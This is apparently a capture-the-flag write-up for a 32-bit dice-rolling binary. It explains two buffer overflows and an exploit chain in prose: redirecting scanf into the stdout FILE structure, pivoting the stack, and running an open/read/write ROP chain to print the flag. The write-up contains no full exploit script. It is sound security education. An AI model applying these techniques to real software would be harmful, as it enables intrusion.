**Category:** Potent Pwnables

32 bit ELF, static link, stripped, NX enabled, No PIE & canary.  

<!-- more -->

The program is a "rolling dice" program. First we input our name, then the program will ask us how many dice would we like to roll. After we input a number, the program will start generating some random data, then store them on the stack memory. The program will then print out `data[i] % 6 + 1`, which represent the numbers we roll in this round. 

There're two vulnerabilities in the program. First it use `scanf("%s", name)` to read our name, which lead to buffer overflow in the `name` buffer. Then, if we input a number that is larger than **23**, the data that program generated will overflow the `data[i]` buffer and **thus overwrite the return address** ( it will be a random data though ).  

Since the binary was stripped, I wasn't sure which algorithm the program used for randomizing, the only thing I knew is that the algorithm will use our name to generate the random data. At that moment, I thought it was just some self-implement function ( which is **NOT** correct, we'll get into that later).  

And so I thought "Hmmm, maybe I could use some symbolic execution tool to calculate the address I want to return, and do the ROP attack". **This was such a huge mistake**, since I'm not familiar with any of the symbolic execution tools -- [angr](http://angr.io/), [Triton](https://github.com/JonathanSalwan/Triton), not to mention the fresh out [manticore](https://github.com/trailofbits/manticore). Even worse, all of the tool failed to calculate the address -- Triton and manticore couldn't even execute the program, it just crashed :(  

After wasting lots of time with those symbolic execution tools, I decided to try something different -- the first vulnerability: overflowing the `name` buffer. And the result was encouraging -- since I found that I could hijack the control flow by using the `call reg` and the `call [reg+offset]` gadget ( we can control the content of several registers ). It seems that there're some `FILE*` pointer behind the `name` buffer, so we can exploit the service by [abusing the FILE structure](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/) ( we can't control the function parameters though). 

Here I chose to use the second gadget ( `call [reg+offset]` ), since when the program execute to that line of code, its second parameter will be the `FILE*` pointer of `stdout`. I control the `eip` and jump to the middle of the main function:  
```
mov     dword ptr [esp+4], offset name
mov     dword ptr [esp], (offset aSSSS+8) ; "%s" <--- I jump to here
call    scanf
mov     eax, ds:name
mov     [esp], eax
call    sub_0804baf0
mov     dword ptr [esp], offset name
call    do_main
```

This will make the program store the `%s` string to the first parameter, then call the `scanf` function, making the program calling `scanf("%s", stdout)` -- and thus we can control the content of `stdout` !

By crafting `stdout`, we can actually hijack the control flow, while having the first parameter controlled. This allowed us to do some advanced ROP attack. Here's what I did after I controlled the `eip`:  
1. Jump to `xchg esp, eax` gadget, migrate the stack to `stdout` (which now controlled by us)  
2. Use `add esp, offset` to skip the uncontrollable member data in `stdout`  
3. Since it's a static linked binary, it's easy for us to find some gadgets and do the **open/read/write** syscall, making the service print out the flag of the challenge. (The **execve** syscall seems to be filtered out in this challenge)

Later did I know (thanks to teammate [Isaac](https://poning.me/)) that there's a thing call [FLIRT](https://www.hex-rays.com/products/ida/tech/flirt/index.shtml) in IDA Pro, which can help the user identify the function call in libc. All we need to do is download a FLIRT signature database from github ( [here's](https://github.com/push0ebp/sig-database) the DB I used for this challenge ), and use **FILE --> Load File --> FLIRT signature file** to load the database. IDA will then identify the function name, making the reverse engineering less painful. By using this technique, we'll be able to identify some libc function, even the location of `stdout`.  

And that's when I found that the "self-implement random" function is actually just `srand()` & `rand()` in libc. According to [meh](https://github.com/mehQQ) from HITCON, you can just brute-force the desired return address. Moreover, because the `name` buffer address is right under the return address, so you can just use `pop esp; ret` to migrate the stack into `name` buffer, and do the ROP attack. Guess I still got a lot of shit to learn :/
